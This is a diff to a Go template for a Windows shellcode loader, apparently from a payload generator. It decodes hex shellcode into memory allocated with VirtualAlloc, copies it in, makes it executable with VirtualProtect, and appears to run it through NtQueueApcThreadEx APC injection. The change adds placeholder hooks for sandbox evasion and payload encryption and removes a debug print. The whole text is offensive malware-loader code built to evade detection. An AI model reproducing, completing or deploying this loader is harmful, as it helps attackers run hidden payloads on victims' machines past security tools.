@@ -2,10 +2,10 @@ package main
 
 import (
 	"encoding/hex"
-	"fmt"
 	"golang.org/x/sys/windows"
 	"unsafe"
 	//__ENCRYPTMODULE__
+	//__SANDBOXMODULE__
 )
 
 const (
@@ -16,6 +16,7 @@ const (
 )
 
 func main() {
+	//__SANDBOX__
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
 	//__ENCRYPTCODE__
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
@@ -26,7 +27,6 @@ func main() {
 	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
 	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
-	fmt.Println("ok")
 	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	oldProtect := PageReadwrite
 	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
